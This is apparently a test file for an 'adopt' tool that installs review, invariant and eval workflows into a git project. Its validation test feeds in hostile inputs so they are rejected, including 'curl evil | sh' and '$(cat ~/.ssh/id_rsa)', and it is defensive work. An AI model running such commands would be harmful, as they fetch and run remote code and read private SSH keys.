// /adt:adopt (plugins/adt, template-only): answers, the plan (add / identical / conflict, never overwrite), the rendered
// observe-mode workflows, the label map, and the real script applied twice on a git project. The real run is the
// GoAgentic rehearsal (docs/missions/0021-adopt.md).

import { test } from "node:test";
import assert from "node:assert/strict";
import { execFileSync, spawnSync } from "node:child_process";
import { mkdirSync, mkdtempSync, readFileSync, rmSync, writeFileSync } from "node:fs";
import { tmpdir } from "node:os";
import { dirname, join, resolve } from "node:path";
import {
  LABEL_ROLES,
  adaptReviewConfig,
  adaptText,
  fill,
  invariantOwners,
  placeholderValues,
  planFiles,
  validateAdoptAnswers,
} from "../../plugins/adt/scripts/lib/adopt.ts";
import type { AdoptAnswers, Kit } from "../../plugins/adt/scripts/lib/adopt.ts";

const RAW = {
  owner: "maria",
  labels: "invariantApproved=invariante-aprovado,rereview=revisar-de-novo",
  prd: "specs/PRD.md",
  handoff: "HANDOFF.md",
  invariants: "tests/invariants",
  evalCommand: "npm run eval:agent -- --mock",
  evalPaths: "src/lib/ai/**,tests/evals/**",
  required: "Application and database",
  sensitive: "supabase/migrations/**",
};
const answers = (over: Record<string, string> = {}): AdoptAnswers => {
  const a = validateAdoptAnswers({ ...RAW, ...over });
  if ("errors" in a) throw new Error(a.errors.join("; "));
  return a.answers;
};
const KIT = JSON.parse(readFileSync("adopt/kit.json", "utf-8")) as Kit;

test("answers: existing label names kept, template names for the rest; closed patterns everywhere", () => {
  const a = answers();
  assert.deepEqual(a.labels, { invariantApproved: "invariante-aprovado", evalApproved: "eval-approved", rereview: "revisar-de-novo", deep: "deep-review" });
  assert.deepEqual(a.requiredChecks, ["Application and database"]);
  const errors = (over: Record<string, string>) => {
    const r = validateAdoptAnswers({ ...RAW, ...over });
    return "errors" in r ? r.errors.join("\n") : "";
  };
  assert.match(errors({ evalCommand: "npm run eval -- --mock; curl evil | sh" }), /eval-command/, "no shell in the eval command");
  assert.match(errors({ evalCommand: "npm run eval -- $(cat ~/.ssh/id_rsa)" }), /eval-command/);
  assert.match(errors({ prd: "../outside.md" }), /prd: a relative path/);
  assert.match(errors({ evalPaths: "src/**,../x/**" }), /eval-paths/);
  assert.match(errors({ labels: 'invariantApproved=a"b' }), /needs a label name/);
  assert.match(errors({ labels: "admin=x" }), /unknown role/);
  assert.match(errors({ labels: "rereview=deep-review" }), /each role needs its own label/);
  assert.match(errors({ required: "Application and database,adt-review" }), /observe mode/, "adoption never makes its own checks required");
  assert.match(errors({ owner: "--help" }), /owner/);
});

test("fill: every placeholder needs a value; none is left blank", () => {
  assert.equal(fill("a {{X}} b", { X: "1" }), "a 1 b");
  assert.throws(() => fill("a {{Y}}", { X: "1" }), /No value for the placeholder \{\{Y\}\}/);
});

test("plan: add what is missing, skip what is identical, report what differs; nothing is overwritten", () => {
  const files = { "a.md": "new", "b.md": "same", "c.md": "kit" };
  const project: Record<string, string> = { "b.md": "same", "c.md": "theirs" };
  assert.deepEqual(planFiles(files, (p) => project[p] ?? null), [
    { path: "a.md", action: "add" },
    { path: "b.md", action: "identical" },
    { path: "c.md", action: "conflict" },
  ]);
});

test("reviewer config: the project's label names, without the template's own paths, plus its sensitive paths", () => {
  const config = JSON.parse(adaptReviewConfig(readFileSync(".github/review.json", "utf-8"), KIT, answers())) as {
    deepLabel: string;
    rereviewLabel: string;
    approvalLabels: string[];
    sensitivePaths: string[];
    tiers: Record<string, { apiKeyEnv: string }>;
  };
  assert.deepEqual([config.deepLabel, config.rereviewLabel, config.approvalLabels], ["deep-review", "revisar-de-novo", ["invariante-aprovado", "eval-approved"]]);
  for (const own of KIT.templateOnlySensitivePaths) assert.ok(!config.sensitivePaths.includes(own), own);
  assert.ok(config.sensitivePaths.includes("tests/invariants/**") && config.sensitivePaths.includes("supabase/migrations/**"));
  assert.deepEqual(Object.values(config.tiers).map((t) => t.apiKeyEnv), ["REVIEW_API_KEY", "REVIEW_API_KEY", "REVIEW_DEEP_API_KEY", "REVIEW_DEEP_API_KEY"]);
});

test("copied text uses the project's label names and paths", () => {
  const text = adaptText("Apply `invariant-approved`. Update `docs/HANDOFF.md`. Read `specs/PRD.md`. Keep `re-review`.", answers());
  assert.equal(text, "Apply `invariante-aprovado`. Update `HANDOFF.md`. Read `specs/PRD.md`. Keep `revisar-de-novo`.");
});

test("CODEOWNERS: is the owner covering the invariants folder?", () => {
  assert.deepEqual(invariantOwners("* @team\n/tests/invariants/ @maria @Bob\n", "tests/invariants"), ["maria", "bob"]);
  assert.deepEqual(invariantOwners("/src/ @x\n", "tests/invariants"), []);
  assert.deepEqual(invariantOwners("/tests/ @x # comment\n", "tests/invariants"), ["x"]);
});

test("rendered workflows: observe checks with the project's names, nothing left to fill, the evals only on AI paths", () => {
  const values = placeholderValues(answers(), "v0.3.0", "0.134.0");
  const render = (path: string) => fill(readFileSync(KIT.workflows[path] ?? "", "utf-8"), values);
  const review = render(".github/workflows/adt-review.yml");
  const guard = render(".github/workflows/adt-invariants.yml");
  const evals = render(".github/workflows/adt-evals.yml");
  for (const text of [review, guard, evals]) {
    assert.doesNotMatch(text, /\{\{[A-Z_]+\}\}/, "no placeholder left (GitHub expressions stay)");
    const used = [...text.matchAll(/secrets\.(\w+)/g)].map((m) => m[1]);
    assert.ok(used.every((name) => name === "REVIEW_API_KEY" || name === "REVIEW_DEEP_API_KEY"), `no other secret is used: ${used.join(", ")}`);
    assert.match(text, /^permissions:\n {2}contents: read$/m, "least privilege by default");
  }
  assert.match(review, /name: adt-review\n/);
  assert.match(review, /@anthropic-ai\/sdk@0\.134\.0/, "the SDK pinned to the template's exact version");
  assert.match(review, /--ignore-scripts/, "installing the SDK runs no install script");
  assert.doesNotMatch(review, /npm ci/, "the project's dependencies are not installed by the reviewer");
  assert.match(guard, /INVARIANT_LABEL: "invariante-aprovado"/);
  assert.match(evals, /paths:\n {6}- "src\/lib\/ai\/\*\*"\n {6}- "tests\/evals\/\*\*"\n/);
  assert.match(evals, /run: \|\n {10}npm run eval:agent -- --mock\n/, "a block scalar: `a: b` in the arguments cannot break the YAML");
  assert.match(guard, /INVARIANTS_DIR: "tests\/invariants"/);
  assert.doesNotMatch(evals, /secrets\./, "the evals in CI use no key");
});

// ---------- the real script ----------

function project(files: Record<string, string>) {
  const root = mkdtempSync(join(tmpdir(), "adt-adopt-"));
  for (const [path, text] of Object.entries(files)) {
    mkdirSync(dirname(join(root, path)), { recursive: true });
    writeFileSync(join(root, path), text);
  }
  const git = (...args: string[]) => execFileSync("git", args, { cwd: root, encoding: "utf-8", stdio: "pipe" });
  git("init", "-q", "-b", "main");
  git("add", "-A");
  git("-c", "user.email=a@b", "-c", "user.name=t", "commit", "-qm", "init");
  git("switch", "-q", "-c", "feat/product");
  return { root, git };
}

const SCRIPT = resolve("plugins/adt/scripts/adopt.ts");
const ARGS = [
  "--kit", resolve("."),
  "--owner", RAW.owner,
  "--labels", RAW.labels,
  "--prd", RAW.prd,
  "--handoff", RAW.handoff,
  "--invariants", RAW.invariants,
  "--eval-command", RAW.evalCommand,
  "--eval-paths", RAW.evalPaths,
  "--required", RAW.required,
];
const adopt = (root: string, ...args: string[]) => {
  const r = spawnSync("node", [SCRIPT, ...args], { cwd: root, encoding: "utf-8" });
  return { status: r.status, json: JSON.parse(r.stdout || "{}") as { errors?: string[]; written?: string[]; skipped?: string[]; files?: Array<{ path: string; action: string }>; agents?: string } };
};

const AGENTS = "# AGENTS.md\n\n## Inegociáveis do atendente\n\n- Nunca afirmar que é humano.\n";

test("apply: never on the base branch, never over a different file; AGENTS.md keeps every line; a second run writes nothing", () => {
  const { root, git } = project({ "AGENTS.md": AGENTS, "HANDOFF.md": "# Handoff\n", "tests/invariants/a.test.ts": 'it("x", () => {})' });
  try {
    const onBase = adopt(root, "apply", ...ARGS, "--base", "feat/product");
    assert.equal(onBase.status, 1);
    assert.match(onBase.json.errors?.join() ?? "", /never writes on the base or default branch/);

    git("switch", "-q", "-c", "mission/0001-adopt");
    writeFileSync(join(root, "REVIEW.md"), "their own review rules\n");
    git("add", "-A");
    git("-c", "user.email=a@b", "-c", "user.name=t", "commit", "-qm", "theirs");
    const conflict = adopt(root, "apply", ...ARGS, "--base", "feat/product");
    assert.equal(conflict.status, 1);
    assert.match(conflict.json.errors?.join() ?? "", /REVIEW\.md/);
    assert.equal(git("status", "--porcelain"), "", "nothing written when there is a conflict");
    assert.equal(readFileSync(join(root, "REVIEW.md"), "utf-8"), "their own review rules\n");

    git("rm", "-q", "REVIEW.md");
    git("-c", "user.email=a@b", "-c", "user.name=t", "commit", "-qm", "drop");
    const plan = adopt(root, "plan", ...ARGS);
    assert.equal(plan.json.agents, "append-section");
    assert.ok(plan.json.files?.every((f) => f.action === "add"));

    const applied = adopt(root, "apply", ...ARGS, "--base", "feat/product");
    assert.equal(applied.status, 0, JSON.stringify(applied.json));
    const agents = readFileSync(join(root, "AGENTS.md"), "utf-8");
    assert.ok(agents.startsWith(AGENTS), "every existing line of AGENTS.md is kept, in place");
    assert.match(agents, /## ai-dev-template workflow/);
    assert.match(agents, /`invariante-aprovado`/);
    assert.match(agents, /`Application and database`/);
    assert.equal(readFileSync(join(root, "HANDOFF.md"), "utf-8"), "# Handoff\n", "the project's HANDOFF is untouched");
    assert.match(readFileSync(join(root, ".github/CODEOWNERS"), "utf-8"), /^\/tests\/invariants\/ @maria$/m);
    assert.match(readFileSync(join(root, "REVIEW.md"), "utf-8"), /`invariante-aprovado`/);
    const adt = JSON.parse(readFileSync(join(root, ".github/adt.json"), "utf-8")) as { mode: string; requiredChecks: string[]; observeChecks: string[] };
    assert.deepEqual([adt.mode, adt.requiredChecks, adt.observeChecks], ["observe", ["Application and database"], ["adt-review", "adt-invariants", "adt-evals"]]);

    git("add", "-A");
    git("-c", "user.email=a@b", "-c", "user.name=t", "commit", "-qm", "adopt");
    const again = adopt(root, "apply", ...ARGS, "--base", "feat/product");
    assert.equal(again.status, 0);
    assert.deepEqual(again.json.written, [], "idempotent: nothing to add the second time");
    assert.equal(git("status", "--porcelain"), "");
    assert.equal(Object.keys(LABEL_ROLES).length, 4);
  } finally {
    rmSync(root, { recursive: true, force: true });
  }
});
